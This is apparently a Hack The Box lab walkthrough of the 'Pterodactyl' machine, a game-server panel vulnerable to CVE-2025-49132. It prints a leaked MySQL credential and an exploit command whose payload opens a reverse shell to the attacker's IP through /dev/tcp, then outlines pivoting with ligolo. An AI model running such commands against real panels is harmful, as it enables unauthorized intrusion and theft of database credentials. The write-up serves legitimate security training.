The TCP port scan reveals that the only two open ports are 22 and 80, the latter redirecting to pterodactyl.htb. I add the resolution to my /etc/hosts file:

echo "10.129.5.93 pterodactyl.htb" | sudo tee -a /etc/hosts

Once the page is accessed, I am presented with a Minecraft server. Investigating further the nature of the software in front of me, I discover that Pterodactyl is a software that allows managing game servers.

The web application subdomain enumeration reveals the presence of a panel subdomain. Adding this to my /etc/hosts file as well, I discover that this is the Pterodactyl service access panel.

echo "10.129.5.93 panel.pterodactyl.htb" | sudo tee -a /etc/hosts

Not knowing any access credentials, I continue to investigate whether there are known vulnerabilities by searching on Google, and I come across CVE-2025-49132, which should be an Unauthenticated RCE.

Running the script retrieved via ExploitDB reveals MySQL database access credentials, which however does not appear to be reachable.

python3 52341.py http://panel.pterodactyl.htb http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel

This script confirmed the vulnerability but did not allow me to execute arbitrary code. After some research on GitHub I found this repository, which is much more dynamic and allows me to open a reverse shell.

python3 exploit.py http://panel.pterodactyl.htb --rce-cmd "sh -i >& /dev/tcp/10.10.15.244/1234 0>&1" --pear-dir /usr/share/php/PEAR

After several attempts I notice that the current user has a nologin shell. This prevents us from using MySQL with the previously retrieved credentials and from accessing the data stored in the database. To work around this limitation we need to move to a shell without this restriction. To do so, we can set up port forwarding with ligolo and access the MySQL service through our own shell.
